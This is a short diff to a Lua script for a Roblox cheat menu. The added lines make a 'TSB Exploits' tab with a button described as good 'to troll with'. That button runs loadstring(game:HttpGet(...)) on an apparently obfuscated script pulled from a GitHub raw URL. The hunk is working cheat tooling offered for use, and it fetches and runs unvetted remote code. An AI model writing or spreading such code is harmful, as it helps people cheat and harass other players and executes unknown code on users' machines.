@@ -69,3 +69,10 @@ game:GetService("ReplicatedStorage").Events.RainbowWhatStat:FireServer(unpack(ar
     print("Clicked")
 end)
 
+
+local Tab = Window:NewTab("Tsbe")
+local Section = Tab:NewSection("TSB Exploits")
+Section:NewButton("Mahito (Domain Expansion)", "this is really cool to troll with because it has a domain", function()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/GreatestLime4K/mahitotsb/refs/heads/main/Protected_6381580361331378.txt'))()
+    print("Clicked")
+end)
